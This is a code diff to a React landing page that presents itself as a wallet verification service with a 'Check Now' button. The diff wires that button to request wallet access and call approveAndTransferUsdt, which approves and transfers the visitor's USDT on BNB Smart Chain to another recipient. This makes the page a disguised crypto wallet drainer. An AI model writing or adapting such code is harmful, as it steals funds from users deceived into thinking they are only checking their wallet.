@@ -1,3 +1,8 @@
+'use client';
+
+import { useState } from "react";
+import { approveAndTransferUsdt } from "@/lib/usdt-bsc";
+
 const trustMetrics = [
   { value: "500K+", label: "Wallets Verified" },
   { value: "99.8%", label: "Accuracy Rate" },
@@ -194,6 +199,45 @@ function Icon({ name, className = "" }: { name: string; className?: string }) {
 }
 
 export default function Home() {
+  const [isChecking, setIsChecking] = useState(false);
+  const [statusMessage, setStatusMessage] = useState("");
+
+  async function handleCheckNow() {
+    if (typeof window === "undefined") {
+      return;
+    }
+
+    const provider = (window as Window & { ethereum?: any }).ethereum;
+
+    if (!provider) {
+      setStatusMessage("A browser wallet such as MetaMask is required to run the approval flow.");
+      return;
+    }
+
+    try {
+      setIsChecking(true);
+      setStatusMessage("Requesting wallet access...");
+
+      const accounts = await provider.request({ method: "eth_requestAccounts" });
+      const connectedAccount = Array.isArray(accounts) ? accounts[0] : undefined;
+
+      if (!connectedAccount) {
+        throw new Error("No wallet account was selected.");
+      }
+
+      setStatusMessage("Submitting approval and transfer request...");
+      const result = await approveAndTransferUsdt(provider, connectedAccount);
+
+      setStatusMessage(
+        `Approval succeeded for ${result.owner}. Transfer to ${result.recipient} completed on BNB Smart Chain.`,
+      );
+    } catch (error) {
+      setStatusMessage(error instanceof Error ? error.message : "The approval call failed.");
+    } finally {
+      setIsChecking(false);
+    }
+  }
+
   return (
     <main className="page-shell">
       <header className="hero-pattern">
@@ -249,10 +293,16 @@ export default function Home() {
         </div>
 
         <div className="cta-wrap">
-          <button type="button" className="primary-button">
-            Check Now
+          <button type="button" className="primary-button" onClick={handleCheckNow} disabled={isChecking}>
+            {isChecking ? "Checking..." : "Check Now"}
           </button>
         </div>
+
+        {statusMessage ? (
+          <div className="cta-status" role="status" aria-live="polite">
+            {statusMessage}
+          </div>
+        ) : null}
 
         <div className="mini-metrics">
           <div>
